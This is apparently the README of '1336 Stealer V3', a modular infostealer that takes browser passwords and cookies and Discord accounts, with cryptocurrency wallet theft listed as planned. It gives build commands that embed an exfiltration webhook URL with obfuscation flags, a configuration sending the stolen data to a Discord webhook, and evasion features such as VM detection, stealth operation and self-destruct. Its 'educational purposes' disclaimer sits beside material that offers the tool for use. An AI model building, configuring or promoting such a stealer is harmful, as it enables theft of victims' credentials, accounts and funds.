# 🔥 1336 Stealer V3 - Modular Edition

A completely restructured, clean, modular, and efficient data collection tool with professional architecture.

## ⚡ Quick Start

```bash
# Install dependencies
npm install

# Run in development mode
npm start

# Build executable
./build.sh https://your-webhook-url.com MyApp

# Build with obfuscation
./build.sh https://your-webhook-url.com MyApp --obfuscate --compress
```

## 🏗️ What's New in V3

### ✨ Complete Architecture Overhaul
- **Modular Design**: Independent, reusable modules
- **Clean Code**: Professional structure and documentation
- **Error Handling**: Comprehensive error management
- **Logging**: Structured logging system
- **Configuration**: Centralized config management

### 📁 New Structure
```
src/
├── config/           # Configuration management
├── core/            # Core utilities and systems
├── modules/         # Feature modules (browsers, crypto, etc.)
├── services/        # External services (discord, upload)
└── main.js         # Application entry point
```

### 🚀 Key Features
- **Cross-platform**: Works on Windows, Linux, macOS
- **Modular**: Enable/disable features independently
- **Efficient**: Optimized performance and resource usage
- **Professional**: Clean code with proper error handling
- **Documented**: Comprehensive documentation

## 📊 Modules

| Module | Status | Description |
|--------|---------|-------------|
| 🌐 Browsers | ✅ Active | Chrome, Firefox, Edge, Opera, Brave |
| 💬 Discord | ✅ Active | Account extraction & webhooks |
| 💰 Crypto | 🔄 Planned | Cryptocurrency wallets |
| 📁 Files | 🔄 Planned | File system scanning |
| 🎮 Games | 🔄 Planned | Gaming platforms |
| 💉 Injection | 🔄 Planned | Browser injection |

## ⚙️ Configuration

### Environment Variables
```bash
WEBHOOK_URL=https://discord.com/api/webhooks/...
NODE_ENV=production
LOG_LEVEL=INFO
ENABLE_BROWSERS=true
ENABLE_DISCORD=true
```

### Configuration File
```json
{
  "webhook": {
    "url": "YOUR_WEBHOOK_URL"
  },
  "modules": {
    "enabled": {
      "browsers": true,
      "discord": true,
      "crypto": false,
      "files": false
    }
  }
}
```

## 🔨 Building

The new modular build system supports:
- Code obfuscation
- Multi-platform targets
- Compression options
- Configuration injection

```bash
# Basic build
node build/builder.js <webhook> <name>

# Advanced build
node build/builder.js <webhook> <name> --obfuscate --compress --target node16-win-x64
```

## 📚 Documentation

- [Full Documentation](docs/README.md)
- [Architecture Guide](docs/README.md#architecture-overview)
- [Module Development](docs/README.md#development)

## 🛡️ Security

- VM detection (configurable)
- Stealth operation
- Encrypted communications
- Self-destruct options
- Obfuscated builds

## 📊 Statistics

Real-time tracking of:
- Browser data (passwords, cookies, etc.)
- System information
- Module execution status
- File operations

## 🤝 Contributing

This project follows professional development standards:
- Modular architecture
- Comprehensive error handling
- Structured logging
- Clean code principles

## ⚠️ Disclaimer

This tool is for educational and authorized testing purposes only. Users are responsible for compliance with applicable laws and regulations.

## 📜 License

MIT License - See LICENSE file for details.

---

*Built with ❤️ for the security research community*